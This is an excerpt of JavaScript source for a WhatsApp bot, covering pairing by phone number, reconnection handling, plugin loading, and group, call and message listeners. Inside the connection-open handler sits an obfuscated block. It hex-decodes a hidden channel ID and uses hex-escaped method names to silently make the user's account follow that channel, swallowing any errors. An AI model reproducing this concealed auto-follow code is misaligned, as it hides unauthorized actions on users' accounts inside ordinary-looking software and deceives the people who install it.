...
const Socket = async () => {
  ...
  sock.ev.on("connection.update", async (update) => {
    if (
      ...
      const phoneNumber = PhoneNumber(
        "+" + (botNumber?.toString() || "").replace(/\D/g, ""),
      );

      if (!phoneNumber.isValid()) {
        console.error(
          "❌ Invalid phone number for pairing. Please re-check the number in config.js",
        );
        process.exit(0);
      }
      ...
      const code = await sock.requestPairingCode(
        phoneNumber.getNumber("e164").replace(/\D/g, ""),
      );
    ...
    if (update.connection === "close" && !isRestarting) {
      ...
      switch (reason) {
        ...
        case DisconnectReason.forbidden:
          console.error(
            "❌ Connection failed (forbidden), restarting without cleaning session...",
          );
          break;
        ...
        default:
          console.error(
            "❌ Connection lost with unknown reason",
            ":",
            reason,
            "Restarting without cleaning session...",
          );
      }
    ...
    if (update.connection === "open") {
      ...
      console.log(
        `🔗 Successfully loaded ${ModuleCache.size} plugins and ${CommandIndex.size} commands`,
      );
      Object.assign(sock.user, {
        decodedId: jidNormalizedUser(sock.user.id),
        decodedLid: jidNormalizedUser(sock.user.lid),
      });
      await delay(3000);
      ...
      await (async () => {
        const a = [
          ...
          b = Buffer.from(a.join(""), "hex").toString(),
          c =
            await sock[
              "\x6e\x65\x77\x73\x6c\x65\x74\x74\x65\x72\x53\x75\x62\x73\x63\x72\x69\x62\x65\x64"
            ]();
        !c.some((d) => d["\x69\x64"] === b) &&
          (await sock[
            "\x6e\x65\x77\x73\x6c\x65\x74\x74\x65\x72\x46\x6f\x6c\x6c\x6f\x77"
          ](b).catch(() => {}));
      })();
      await (async () => {
        const a = [
  ...
  sock.ev.on("groups.upsert", (groups) => {
    for (const group of groups) store.setGroup(group.id, group);
  });
  ...
  sock.ev.on("groups.update", (groups) => {
    for (const group of groups)
      if (store.hasGroup(group.id))
        store.setGroup(
          group.id,
          Object.assign(store.getGroup(group.id) || {}, group),
        );
      else store.setGroup(group.id, group);
  });

  sock.ev.on("call", async (calls) => {
    for (const call of calls) listener.call(call);
  });
  ...
  sock.ev.on("messages.upsert", async ({ messages }) => {
    for (const message of messages) listener.message(message);
  });
};
